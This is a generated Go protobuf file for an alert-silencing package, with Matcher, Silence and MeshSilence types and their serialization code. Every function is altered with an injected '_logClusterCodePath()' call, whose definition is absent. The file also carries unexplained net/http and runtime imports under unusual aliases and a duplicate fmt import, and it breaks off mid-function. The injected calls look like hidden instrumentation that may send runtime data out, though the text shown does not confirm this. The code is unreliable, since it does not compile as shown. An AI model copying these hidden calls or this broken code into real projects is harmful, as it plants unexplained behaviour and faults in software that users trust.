package silencepb

import (
	proto "github.com/gogo/protobuf/proto"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	fmt "fmt"
	math "math"
	_ "github.com/gogo/protobuf/gogoproto"
	time "time"
	types "github.com/gogo/protobuf/types"
	io "io"
)

var _ = proto.Marshal
var _ = fmt.Errorf
var _ = math.Inf
var _ = time.Kitchen

const _ = proto.GoGoProtoPackageIsVersion2

type Matcher_Type int32

const (
	Matcher_EQUAL	Matcher_Type	= 0
	Matcher_REGEXP	Matcher_Type	= 1
)

var Matcher_Type_name = map[int32]string{0: "EQUAL", 1: "REGEXP"}
var Matcher_Type_value = map[string]int32{"EQUAL": 0, "REGEXP": 1}

func (x Matcher_Type) String() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return proto.EnumName(Matcher_Type_name, int32(x))
}
func (Matcher_Type) EnumDescriptor() ([]byte, []int) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fileDescriptorSilence, []int{0, 0}
}

type Matcher struct {
	Type	Matcher_Type	`protobuf:"varint,1,opt,name=type,proto3,enum=silencepb.Matcher_Type" json:"type,omitempty"`
	Name	string		`protobuf:"bytes,2,opt,name=name,proto3" json:"name,omitempty"`
	Pattern	string		`protobuf:"bytes,3,opt,name=pattern,proto3" json:"pattern,omitempty"`
}

func (m *Matcher) Reset() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	*m = Matcher{}
}
func (m *Matcher) String() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return proto.CompactTextString(m)
}
func (*Matcher) ProtoMessage() {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (*Matcher) Descriptor() ([]byte, []int) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fileDescriptorSilence, []int{0}
}

type Comment struct {
	Author		string		`protobuf:"bytes,1,opt,name=author,proto3" json:"author,omitempty"`
	Comment		string		`protobuf:"bytes,2,opt,name=comment,proto3" json:"comment,omitempty"`
	Timestamp	time.Time	`protobuf:"bytes,3,opt,name=timestamp,stdtime" json:"timestamp"`
}

func (m *Comment) Reset() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	*m = Comment{}
}
func (m *Comment) String() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return proto.CompactTextString(m)
}
func (*Comment) ProtoMessage() {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (*Comment) Descriptor() ([]byte, []int) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fileDescriptorSilence, []int{1}
}

type Silence struct {
	Id		string		`protobuf:"bytes,1,opt,name=id,proto3" json:"id,omitempty"`
	Matchers	[]*Matcher	`protobuf:"bytes,2,rep,name=matchers" json:"matchers,omitempty"`
	StartsAt	time.Time	`protobuf:"bytes,3,opt,name=starts_at,json=startsAt,stdtime" json:"starts_at"`
	EndsAt		time.Time	`protobuf:"bytes,4,opt,name=ends_at,json=endsAt,stdtime" json:"ends_at"`
	UpdatedAt	time.Time	`protobuf:"bytes,5,opt,name=updated_at,json=updatedAt,stdtime" json:"updated_at"`
	Comments	[]*Comment	`protobuf:"bytes,7,rep,name=comments" json:"comments,omitempty"`
	CreatedBy	string		`protobuf:"bytes,8,opt,name=created_by,json=createdBy,proto3" json:"created_by,omitempty"`
	Comment		string		`protobuf:"bytes,9,opt,name=comment,proto3" json:"comment,omitempty"`
}

func (m *Silence) Reset() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	*m = Silence{}
}
func (m *Silence) String() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return proto.CompactTextString(m)
}
func (*Silence) ProtoMessage() {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (*Silence) Descriptor() ([]byte, []int) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fileDescriptorSilence, []int{2}
}

type MeshSilence struct {
	Silence		*Silence	`protobuf:"bytes,1,opt,name=silence" json:"silence,omitempty"`
	ExpiresAt	time.Time	`protobuf:"bytes,2,opt,name=expires_at,json=expiresAt,stdtime" json:"expires_at"`
}

func (m *MeshSilence) Reset() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	*m = MeshSilence{}
}
func (m *MeshSilence) String() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return proto.CompactTextString(m)
}
func (*MeshSilence) ProtoMessage() {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (*MeshSilence) Descriptor() ([]byte, []int) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fileDescriptorSilence, []int{3}
}
func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	proto.RegisterType((*Matcher)(nil), "silencepb.Matcher")
	proto.RegisterType((*Comment)(nil), "silencepb.Comment")
	proto.RegisterType((*Silence)(nil), "silencepb.Silence")
	proto.RegisterType((*MeshSilence)(nil), "silencepb.MeshSilence")
	proto.RegisterEnum("silencepb.Matcher_Type", Matcher_Type_name, Matcher_Type_value)
}
func (m *Matcher) Marshal() (dAtA []byte, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	size := m.Size()
	dAtA = make([]byte, size)
	n, err := m.MarshalTo(dAtA)
	if err != nil {
		return nil, err
	}
	return dAtA[:n], nil
}
func (m *Matcher) MarshalTo(dAtA []byte) (int, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var i int
	_ = i
	var l int
	_ = l
	if m.Type != 0 {
		dAtA[i] = 0x8
		i++
		i = encodeVarintSilence(dAtA, i, uint64(m.Type))
	}
	if len(m.Name) > 0 {
		dAtA[i] = 0x12
		i++
		i = encodeVarintSilence(dAtA, i, uint64(len(m.Name)))
		i += copy(dAtA[i:], m.Name)
	}
	if len(m.Pattern) > 0 {
		dAtA[i] = 0x1a
		i++
		i = encodeVarintSilence(dAtA, i, uint64(len(m.Pattern)))
		i += copy(dAtA[i:], m.Pattern)
	}
	return i, nil
}
func (m *Comment) Marshal() (dAtA []byte, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	size := m.Size()
	dAtA = make([]byte, size)
	n, err := m.MarshalTo(dAtA)
	if err != nil {
		return nil, err
	}
	return dAtA[:n], nil
}
func (m *Comment) MarshalTo(dAtA []byte) (int, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var i int
	_ = i
	var l int
	_ = l
	if len(m.Author) > 0 {
		dAtA[i] = 0xa
		i++
		i = encodeVarintSilence(dAtA, i, uint64(len(m.Author)))
		i += copy(dAtA[i:], m.Author)
	}
	if len(m.Comment) > 0 {
		dAtA[i] = 0x12
		i++
		i = encodeVarintSilence(dAtA, i, uint64(len(m.Comment)))
		i += copy(dAtA[i:], m.Comment)
	}
	dAtA[i] = 0x1a
	i++
	i = encodeVarintSilence(dAtA, i, uint64(types.SizeOfStdTime(m.Timestamp)))
	n1, err := types.StdTimeMarshalTo(m.Timestamp, dAtA[i:])
	if err != nil {
		return 0, err
	}
	i += n1
	return i, nil
}
func (m *Silence) Marshal() (dAtA []byte, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	size := m.Size()
	dAtA = make([]byte, size)
	n, err := m.MarshalTo(dAtA)
	if err != nil {
		return nil, err
	}
	return dAtA[:n], nil
}
func (m *Silence) MarshalTo(dAtA []byte) (int, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var i int
	_ = i
	var l int
	_ = l
	if len(m.Id) > 0 {
		dAtA[i] = 0xa
		i++
		i = encodeVarintSilence(dAtA, i, uint64(len(m.Id)))
		i += copy(dAtA[i:], m.Id)
	}
	if len(m.Matchers) > 0 {
		for _, msg := range m.Matchers {
			dAtA[i] = 0x12
			i++
			i = encodeVarintSilence(dAtA, i, uint64(msg.Size()))
			n, err := msg.MarshalTo(dAtA[i:])
			if err != nil {
				return 0, err
			}
			i += n
		}
	}
	dAtA[i] = 0x1a
	i++
	i = encodeVarintSilence(dAtA, i, uint64(types.SizeOfStdTime(m.StartsAt)))
	n2, err := types.StdTimeMarshalTo(m.StartsAt, dAtA[i:])
	if err != nil {
		return 0, err
	}
	i += n2
	dAtA[i] = 0x22
	i++
	i = encodeVarintSilence(dAtA, i, uint64(types.SizeOfStdTime(m.EndsAt)))
	n3, err := types.StdTimeMarshalTo(m.EndsAt, dAtA[i:])
	if err != nil {
		return 0, err
	}
	i += n3
	dAtA[i] = 0x2a
	i++
	i = encodeVarintSilence(dAtA, i, uint64(types.SizeOfStdTime(m.UpdatedAt)))
	n4, err := types.StdTimeMarshalTo(m.UpdatedAt, dAtA[i:])
	if err != nil {
		return 0, err
	}
	i += n4
	if len(m.Comments) > 0 {
		for _, msg := range m.Comments {
			dAtA[i] = 0x3a
			i++
			i = encodeVarintSilence(dAtA, i, uint64(msg.Size()))
			n, err := msg.MarshalTo(dAtA[i:])
			if err != nil {
				return 0, err
			}
			i += n
		}
	}
	if len(m.CreatedBy) > 0 {
		dAtA[i] = 0x42
		i++
		i = encodeVarintSilence(dAtA, i, uint64(len(m.CreatedBy)))
		i += copy(dAtA[i:], m.CreatedBy)
	}
	if len(m.Comment) > 0 {
		dAtA[i] = 0x4a
		i++
		i = encodeVarintSilence(dAtA, i, uint64(len(m.Comment)))
		i += copy(dAtA[i:], m.Comment)
	}
	return i, nil
}
func (m *MeshSilence) Marshal() (dAtA []byte, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	size := m.Size()
	dAtA = make([]byte, size)
	n, err := m.MarshalTo(dAtA)
	if err != nil {
		return nil, err
	}
	return dAtA[:n], nil
}
func (m *MeshSilence) MarshalTo(dAtA []byte) (int, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var i int
	_ = i
	var l int
	_ = l
	if m.Silence != nil {
		dAtA[i] = 0xa
		i++
		i = encodeVarintSilence(dAtA, i, uint64(m.Silence.Size()))
		n5, err := m.Silence.MarshalTo(dAtA[i:])
		if err != nil {
			return 0, err
		}
		i += n5
	}
	dAtA[i] = 0x12
	i++
	i = encodeVarintSilence(dAtA, i, uint64(types.SizeOfStdTime(m.ExpiresAt)))
	n6, err := types.StdTimeMarshalTo(m.ExpiresAt, dAtA[i:])
	if err != nil {
		return 0, err
	}
	i += n6
	return i, nil
}
func encodeVarintSilence(dAtA []byte, offset int, v uint64) int {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for v >= 1<<7 {
		dAtA[offset] = uint8(v&0x7f | 0x80)
		v >>= 7
		offset++
	}
	dAtA[offset] = uint8(v)
	return offset + 1
}
func (m *Matcher) Size() (n int) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var l int
	_ = l
	if m.Type != 0 {
		n += 1 + sovSilence(uint64(m.Type))
	}
	l = len(m.Name)
	if l > 0 {
		n += 1 + l + sovSilence(uint64(l))
	}
	l = len(m.Pattern)
	if l > 0 {
		n += 1 + l + sovSilence(uint64(l))
	}
	return n
}
func (m *Comment) Size() (n int) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var l int
	_ = l
	l = len(m.Author)
	if l > 0 {
		n += 1 + l + sovSilence(uint64(l))
	}
	l = len(m.Comment)
	if l > 0 {
		n += 1 + l + sovSilence(uint64(l))
	}
	l = types.SizeOfStdTime(m.Timestamp)
	n += 1 + l + sovSilence(uint64(l))
	return n
}
func (m *Silence) Size() (n int) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var l int
	_ = l
	l = len(m.Id)
	if l > 0 {
		n += 1 + l + sovSilence(uint64(l))
	}
	if len(m.Matchers) > 0 {
		for _, e := range m.Matchers {
			l = e.Size()
			n += 1 + l + sovSilence(uint64(l))
		}
	}
	l = types.SizeOfStdTime(m.StartsAt)
	n += 1 + l + sovSilence(uint64(l))
	l = types.SizeOfStdTime(m.EndsAt)
	n += 1 + l + sovSilence(uint64(l))
	l = types.SizeOfStdTime(m.UpdatedAt)
	n += 1 + l + sovSilence(uint64(l))
	if len(m.Comments) > 0 {
		for _, e := range m.Comments {
			l = e.Size()
			n += 1 + l + sovSilence(uint64(l))
		}
	}
	l = len(m.CreatedBy)
	if l > 0 {
		n += 1 + l + sovSilence(uint64(l))
	}
	l = len(m.Comment)
	if l > 0 {
		n += 1 + l + sovSilence(uint64(l))
	}
	return n
}
func (m *MeshSilence) Size() (n int) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var l int
	_ = l
	if m.Silence != nil {
		l = m.Silence.Size()
		n += 1 + l + sovSilence(uint64(l))
	}
	l = types.SizeOfStdTime(m.ExpiresAt)
	n += 1 + l + sovSilence(uint64(l))
	return n
}
func sovSilence(x uint64) (n int) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for {
		n++
		x >>= 7
		if x == 0 {
			break
		}
	}
	return n
}
func sozSilence(x uint64) (n int) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return sovSilence(uint64((x << 1) ^ uint64((int64(x) >> 63))))
}
func (m *Matcher) Unmarshal(dAtA []byte) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	l := len(dAtA)
	iNdEx := 0
	for iNdEx < l {
		preIndex := iNdEx
		var wire uint64
		for shift := uint(0); ; shift += 7 {
			if shift >= 64 {
				return ErrIntOverflowSilence
			}
			if iNdEx >= l {
				return io.ErrUnexpectedEOF
			}
			b := dAtA[iNdEx]
			iNdEx++
			wire |= (uint64(b) & 0x7F) << shift
			if b < 0x80 {
				break
			}
		}
		fieldNum := int32(wire >> 3)
		wireType := int(wire & 0x7)
		if wireType == 4 {
			return fmt.Errorf("proto: Matcher: wiretype end group for non-group")
		}
		if fieldNum <= 0 {
			return fmt.Errorf("proto: Matcher: illegal tag %d (wire type %d)", fieldNum, wire)
		}
		switch fieldNum {
		case 1:
			if wireType != 0 {
				return fmt.Errorf("proto: wrong wireType = %d for field Type", wireType)
			}
			m.Type = 0
			for shift := uint(0); ; shift += 7 {
				if shift >= 64 {
					return ErrIntOverflowSilence
				}
				if iNdEx >= l {
					return io.ErrUnexpectedEOF
				}
				b := dAtA[iNdEx]
				iNdEx++
				m.Type |= (Matcher_Type(b) & 0x7F) << shift
				if b < 0x80 {
					break
				}
			}
		case 2:
			if wireType != 2 {
				return fmt.Errorf("proto: wrong wireType = %d for field Name", wireType)
			}
			var stringLen uint64
			for shift := uint(0); ; shift += 7 {
				if shift >= 64 {
					return ErrIntOverflowSilence
				}
				if iNdEx >= l {
					return io.ErrUnexpectedEOF
				}
				b := dAtA[iNdEx]
				iNdEx++
				stringLen |= (uint64(b) & 0x7F) << shift
				if b < 0x80 {
					break
				}
			}
			intStringLen := int(stringLen)
			if intStringLen < 0 {
				return ErrInvalidLengthSilence
			}
			postIndex := iNdEx + intStringLen
			if postIndex > l {
				return io.ErrUnexpectedEOF
			}
			m.Name = string(dAtA[iNdEx:postIndex])
			iNdEx = postIndex
		case 3:
			if wireType != 2 {
				return fmt.Errorf("proto: wrong wireType = %d for field Pattern", wireType)
			}
			var stringLen uint64
			for shift := uint(0); ; shift += 7 {
				if shift >= 64 {
					return ErrIntOverflowSilence
				}
				if iNdEx >= l {
					return io.ErrUnexpectedEOF
				}
				b := dAtA[iNdEx]
				iNdEx++
				stringLen |= (uint64(b) & 0x7F) << shift
				if b < 0x80 {
					break
				}
			}
			intStringLen := int(stringLen)
			if intStringLen < 0 {
				return ErrInvalidLengthSilence
			}
			postIndex := iNdEx + intStringLen
			if postIndex > l {
				return io.ErrUnexpectedEOF
			}
			m.Pattern = string(dAtA[iNdEx:postIndex])
			iNdEx = postIndex
		default:
			iNdEx = preIndex
			skippy, err := skipSilence(dAtA[iNdEx:])
			if err != nil {
				return err
			}
			if skippy < 0 {
				return ErrInvalidLengthSilence
			}
			if (iNdEx + skippy) > l {
				return io.ErrUnexpectedEOF
			}
			iNdEx += skippy
		}
	}
	if iNdEx > l {
		return io.ErrUnexpectedEOF
	}
	return nil
}
func (m *Comment) Unmarshal(dAtA []byte) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	l := len(dAtA)
	iNdEx := 0
	for iNdEx < l {
		preIndex := iNdEx
		var wire uint64
		for shift := uint(0); ; shift += 7 {
			if shift >= 64 {
				return ErrIntOverflowSilence
			}
			if iNdEx >= l {
				return io.ErrUnexpectedEOF
			}
			b := dAtA[iNdEx]
			iNdEx++
			wire |= (uint64(b) & 0x7F) << shift
			if b < 0x80 {
				break
			}
		}
		fieldNum := int32(wire >> 3)
		wireType := int(wire & 0x7)
		if wireType == 4 {
			return fmt.Errorf("proto: Comment: wiretype end group for non-group")
		}
		if fieldNum <= 0 {
			return fmt.Errorf("proto: Comment: illegal tag %d (wire type %d)", fieldNum, wire)
		}
		switch fieldNum {
		case 1:
			if wireType != 2 {
				return fmt.Errorf("proto: wrong wireType = %d for field Author", wireType)
			}
			var stringLen uint64
			for shift := uint(0); ; shift += 7 {
				if shift >= 64 {
					return ErrIntOverflowSilence
				}
				if iNdEx >= l {
					return io.ErrUnexpectedEOF
				}
				b := dAtA[iNdEx]
				iNdEx++
				stringLen |= (uint64(b) & 0x7F) << shift
				if b < 0x80 {
					break
				}
			}
			intStringLen := int(stringLen)
			if intStringLen < 0 {
				return ErrInvalidLengthSilence
			}
			postIndex := iNdEx + intStringLen
			if postIndex > l {
				return io.ErrUnexpectedEOF
			}
			m.Author = string(dAtA[iNdEx:postIndex])
			iNdEx = postIndex
		case 2:
			if wireType != 2 {
				return fmt.Errorf("proto: wrong wireType = %d for field Comment", wireType)
			}
			var stringLen uint64
			for shift := uint(0); ; shift += 7 {
				if shift >= 64 {
					return ErrIntOverflowSilence
				}
				if iNdEx >= l {
					return io.ErrUnexpectedEOF
				}
				b := dAtA[iNdEx]
				iNdEx++
				stringLen |= (uint64(b) & 0x7F) << shift
				if b < 0x80 {
					break
				}
			}
			intStringLen := int(stringLen)
			if intStringLen < 0 {
				return ErrInvalidLengthSilence
			}
			postIndex := iNdEx + intStringLen
			if postIndex > l {
				return io.ErrUnexpectedEOF
			}
			m.Comment = string(dAtA[iNdEx:postIndex])
			iNdEx = postIndex
		case 3:
			if wireType != 2 {
				return fmt.Errorf("proto: wrong wireType = %d for field Timestamp", wireType)
			}
			var msglen int
			for shift := uint(0); ; shift += 7 {
				if shift >= 64 {
					return ErrIntOverflowSilence
				}
				if iNdEx >= l {
					return io.ErrUnexpectedEOF
				}
				b := dAtA[iNdEx]
				iNdEx++
				msglen |= (int(b) & 0x7F) << shift
				if b < 0x80 {
					break
				}
			}
			if msglen < 0 {
				return ErrInvalidLengthSilence
			}
			postIndex := iNdEx + msglen
			if postIndex > l {
				return io.ErrUnexpectedEOF
			}
			if err := types.StdTimeUnmarshal(&m.Timestamp, dAtA[iNdEx:postIndex]); err != nil {
				return err
			}
			iNdEx = postIndex
		default:
			iNdEx = preIndex
			skippy, err := skipSilence(dAtA[iNdEx:])
			if err != nil {
				return err
			}
			if skippy < 0 {
				return ErrInvalidLengthSilence
			}
			if (iNdEx + skippy) > l {
				return io.ErrUnexpectedEOF
			}
			iNdEx += skippy
		}
	}
	if iNdEx > l {
		return io.ErrUnexpectedEOF
	}
	return nil
}
func (m *Silence) Unmarshal(dAtA []byte) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	l := len(dAtA)
	iNdEx := 0
	for iNdEx < l {
		preIndex := iNdEx
		var wire uint64
		for shift := uint(0); ; shift += 7 {
			if shift >= 64 {
				return ErrIntOverflowSilence
			}
			if iNdEx >= l {
				return io.ErrUnexpectedEOF
			}
			b := dAtA[iNdEx]
			iNdEx++
			wire |= (uint64(b) & 0x7F) << shift
			if b < 0x80 {
				break
			}
		}
		fieldNum := int32(wire >> 3)
		wireType := int(wire & 0x7)
		if wireType == 4 {
			return fmt.Errorf("proto: Silence: wiretype end group for non-group")
		}
		if fieldNum <= 0 {
			return fmt.Errorf("proto: Silence: illegal tag %d (wire type %d)", fieldNum, wire)
		}
		switch fieldNum {
		case 1:
			if wireType != 2 {
				return fmt.Errorf("proto: wrong wireType = %d for field Id", wireType)
			}
			var stringLen uint64
			for shift := uint(0); ; shift += 7 {
				if shift >= 64 {
					return ErrIntOverflowSilence
				}
				if iNdEx >= l {
					return io.ErrUnexpectedEOF
				}
				b := dAtA[iNdEx]
				iNdEx++
				stringLen |= (uint64(b) & 0x7F) << shift
				if b < 0x80 {
					break
				}
			}
			intStringLen := int(stringLen)
			if intStringLen < 0 {
				return ErrInvalidLengthSilence
			}
			postIndex := iNdEx + intStringLen
			if postIndex > l {
				return io.ErrUnexpectedEOF
			}
			m.Id = string(dAtA[iNdEx:postIndex])
			iNdEx = postIndex
		case 2:
			if wireType != 2 {
				return fmt.Errorf("proto: wrong wireType = %d for field Matchers", wireType)
			}
			var msglen int
			for shift := uint(0); ; shift += 7 {
				if shift >= 64 {
					return ErrIntOverflowSilence
				}
				if iNdEx >= l {
					return io.ErrUnexpectedEOF
				}
				b := dAtA[iNdEx]
				iNdEx++
				msglen |= (int(b) & 0x7F) << shift
				if b < 0x80 {
					break
				}
			}
			if msglen < 0 {
				return ErrInvalidLengthSilence
			}
			postIndex := iNdEx + msglen
			if postIndex > l {
				return io.ErrUnexpectedEOF
			}
			m.Matchers = append(m.Matchers, &Matcher{})
			if err := m.Matchers[len(m.Matchers)-1].Unmarshal(dAtA[iNdEx:postIndex]); err != nil {
				return err
			}
			iNdEx = postIndex
		case 3:
			if wireType != 2 {
				return fmt.Errorf("proto: wrong wireType = %d for field StartsAt", wireType)
			}
			var msglen int
			for shift := uint(0); ; shift += 7 {
				if shift >= 64 {
					return ErrIntOverflowSilence
				}
				if iNdEx >= l {
					return io.ErrUnexpectedEOF
				}
				b := dAtA[iNdEx]
				iNdEx++
				msglen |= (int(b) & 0x7F) << shift
				if b < 0x80 {
					break
				}
			}
			if msglen < 0 {
				return ErrInvalidLengthSilence
			}
			postIndex := iNdEx + msglen
			if postIndex > l {
				return io.ErrUnexpectedEOF
			}
			if err := types.StdTimeUnmarshal(&m.StartsAt, dAtA[iNdEx:postIndex]); err != nil {
				return err
			}
			iNdEx = postIndex
		case 4:
			if wireType != 2 {
				return fmt.Errorf("proto: wrong wireType = %d for field EndsAt", wireType)
			}
			var msglen int
			for shift := uint(0); ; shift += 7 {
				if shift >= 64 {
					return ErrIntOverflowSilence
				}
				if iNdEx >= l {
					return io.ErrUnexpectedEOF
				}
				b := dAtA[iNdEx]
				iNdEx++
				msglen |= (int(b) & 0x7F) << shift
				if b < 0x80 {
					break
				}
			}
			if msglen < 0 {
				return ErrInvalidLengthSilence
			}
			postIndex := iNdEx + msglen
			if postIndex > l {
				return io.ErrUnexpectedEOF
			}
			if err := types.StdTimeUnmarshal(&m.EndsAt, dAtA[iNdEx:postIndex]); err != nil {
				return err
			}
			iNdEx = postIndex
		case 5:
			if wireType != 2 {
				return fmt.Errorf("proto: wrong wireType = %d for field UpdatedAt", wireType)
			}
			var msglen int
			for shift := uint(0); ; shift += 7 {
				if shift >= 64 {
					return ErrIntOverflowSilence
				}
				if iNdEx >= l {
					return io.ErrUnexpectedEOF
				}
				b := dAtA[iNdEx]
				iNdEx++
				msglen |= (int(b) & 0x7F) << shift
				if b < 0x80 {
					break
				}
			}
			if msglen < 0 {
				return ErrInvalidLengthSilence
			}
			postIndex := iNdEx + msglen
			if postIndex > l {
				return io.ErrUnexpectedEOF
			}
			if err := types.StdTimeUnmarshal(&m.UpdatedAt, dAtA[iNdEx:postIndex]); err != nil {
				return err
			}
			iNdEx = postIndex
		case 7:
			if wireType != 2 {
				return fmt.Errorf("proto: wrong wireType = %d for field Comments", wireType)
			}
			var msglen int
			for shift := uint(0); ; shift += 7 {
				if shift >= 64 {
					return ErrIntOverflowSilence
				}
				if iNdEx >= l {
					return io.ErrUnexpectedEOF
				}
				b := dAtA[iNdEx]
				iNdEx++
				msglen |= (int(b) & 0x7F) << shift
				if b < 0x80 {
					break
				}
			}
			if msglen < 0 {
				return ErrInvalidLengthSilence
			}
			postIndex := iNdEx + msglen
			if postIndex > l {
				return io.ErrUnexpectedEOF
			}
			m.Comments = append(m.Comments, &Comment{})
			if err := m.Comments[len(m.Comments)-1].Unmarshal(dAtA[iNdEx:postIndex]); err != nil {
				return err
			}
			iNdEx = postIndex
		case 8:
			if wireType != 2 {
				return fmt.Errorf("proto: wrong wireType = %d for field CreatedBy", wireType)
			}
			var stringLen uint64
			for shift := uint(0); ; shift += 7 {
				if shift >= 64 {
					return ErrIntOverflowSilence
				}
				if iNdEx >= l {
					return io.ErrUnexpectedEOF
				}
				b := dAtA[iNdEx]
				iNdEx++
				stringLen |= (uint64(b) & 0x7F) << shift
				if b < 0x80 {
					break
				}
			}
			intStringLen := int(stringLen)
			if intStringLen < 0 {
				return ErrInvalidLengthSilence
			}
			postIndex := iNdEx + intStringLen
			if postIndex > l {
				return io.ErrUnexpectedEOF
			}
			m.CreatedBy = string(dAtA[iNdEx:postIndex])
			iNdEx = postIndex
		case 9:
			if wireType != 2 {
				return fmt.Errorf("proto: wrong wireType = %d for field Comment", wireType)
			}
			var stringLen uint64
			for shift := uint(0); ; shift += 7 {
				if shift >= 64 {
					return ErrIntOverflowSilence
				}
				if iNdEx >= l {
					return io.ErrUnexpectedEOF
				}
				b := dAtA[iNdEx]
				iNdEx++
				stringLen |= (uint64(b) & 0x7F) << shift
				if b < 0x80 {
					break
				}
			}
			intStringLen := int(stringLen)
			if intStringLen < 0 {
				return ErrInvalidLengthSilence
			}
			postIndex := iNdEx + intStringLen
			if postIndex > l {
				return io.ErrUnexpectedEOF
			}
			m.Comment = string(dAtA[iNdEx:postIndex])
			iNdEx = postIndex
		default:
			iNdEx = preIndex
			skippy, err := skipSilence(dAtA[iNdEx:])
			if err != nil {
				return err
			}
			if skippy < 0 {
				return ErrInvalidLengthSilence
			}
			if (iNdEx + skippy) > l {
				return io.ErrUnexpectedEOF
			}
			iNdEx += skippy
		}
	}
	if iNdEx > l {
		return io.ErrUnexpectedEOF
	}
	return nil
}
func (m *MeshSilence) Unmarshal(dAtA []byte) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	l := len(dAtA)
	iNdEx := 0
	for iNdEx < l {
		preIndex := iNdEx
		var wire uint64
		for shift := uint(0); ; shift += 7 {
			if shift >= 64 {
				return ErrIntOverflowSilence
			}
			if iNdEx >= l {
				return io.ErrUnexpectedEOF
			}
			b := dAtA[iNdEx]
			iNdEx++
			wire |= (uint64(b) & 0x7F) << shift
			if b < 0x80 {
				break
			}
		}
		fieldNum := int32(wire >> 3)
		wireType := int(wire & 0x7)
		if wireType == 4 {
			return fmt.Errorf("proto: MeshSilence: wiretype end group for non-group")
		}
		if fieldNum <= 0 {
			return fmt.Errorf("proto: MeshSilence: illegal tag %d (wire type %d)", fieldNum, wire)
		}
		switch fieldNum {
		case 1:
			if wireType != 2 {
				return fmt.Errorf("proto: wrong wireType = %d for field Silence", wireType)
			}
			var msglen int
			for shift := uint(0); ; shift += 7 {
				if shift >= 64 {
					return ErrIntOverflowSilence
				}
				if iNdEx >= l {
					return io.ErrUnexpectedEOF
				}
				b := dAtA[iNdEx]
				iNdEx++
				msglen |= (int(b) & 0x7F) << shift
				if b < 0x80 {
					break
				}
			}
			if msglen < 0 {
				return ErrInvalidLengthSilence
			}
			postIndex := iNdEx + msglen
			if postIndex > l {
				return io.ErrUnexpectedEOF
			}
			if m.Silence == nil {
				m.Silence = &Silence{}
			}
			if err := m.Silence.Unmarshal(dAtA[iNdEx:postIndex]); err != nil {
				return err
			}
			iNdEx = postIndex
		case 2:
			if wireType != 2 {
				return fmt.Errorf("proto: wrong wireType = %d for field ExpiresAt", wireType)
			}
			var msglen int
			for shift := uint(0); ; shift += 7 {
				if shift >= 64 {
					return ErrIntOverflowSilence
				}
				if iNdEx >= l {
					return io.ErrUnexpectedEOF
				}
				b := dAtA[iNdEx]
				iNdEx++
				msglen |= (int(b) & 0x7F) << shift
				if b < 0x80 {
					break
				}
			}
			if msglen < 0 {
				return ErrInvalidLengthSilence
			}
			postIndex := iNdEx + msglen
			if postIndex > l {
				return io.ErrUnexpectedEOF
			}
			if err := types.StdTimeUnmarshal(&m.ExpiresAt, dAtA[iNdEx:postIndex]); err != nil {
				return err
			}
			iNdEx = postIndex
		default:
			iNdEx = preIndex
			skippy, err := skipSilence(dAtA[iNdEx:])
			if err != nil {
				return err
			}
			if skippy < 0 {
				return ErrInvalidLengthSilence
			}
			if (iNdEx + skippy) > l {
				return io.ErrUnexpectedEOF
			}
			iNdEx += skippy
		}
	}
	if iNdEx > l {
		return io.ErrUnexpectedEOF
	}
	return nil
}
func skipSilence(dAtA []byte) (n int, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	l := len(dAtA)
	iNdEx := 0
	for iNdEx < l {
		var wire uint64
		for shift := uint(0); ; shift += 7 {
			if shift >= 64 {
				return 0, ErrIntOverflowSilence
			}
			if iNdEx >= l {
				return 0, io.ErrUnexpectedEOF
			}
			b := dAtA[iNdEx]
			iNdEx++
			wire |= (uint64(b) & 0x7F) << shift
			if b < 0x80 {
				break
			}
		}
		wireType := int(wire & 0x7)
		switch wireType {
		case 0:
			for shift := uint(0); ; shift += 7 {
				if shift >= 64 {
					return 0, ErrIntOverflowSilence
				}
				if iNdEx >= l {
					return 0, io.ErrUnexpectedEOF
				}
				iNdEx++
				if dAtA[iNdEx-1] < 0x80 {
					break
				}
			}
			return iNdEx, nil
		case 1:
			iNdEx += 8
			return iNdEx, nil
		case 2:
			var length int
			for shift := uint(0); ; shift += 7 {
				if shift >= 64 {
					return 0, ErrIntOverflowSilence
				}
				if iNdEx >= l {
					return 0, io.ErrUnexpectedEOF
				}
				b := dAtA[iNdEx]
				iNdEx++
				length |= (int(b) & 0x7F) << shift
				if b < 0x80 {
					break
				}
			}
			iNdEx += length
			if length < 0 {
				return 0, ErrInvalidLengthSilence
			}
			return iNdEx, nil
		case 3:
			for {
				var innerWire uint64
				var start int = iNdEx
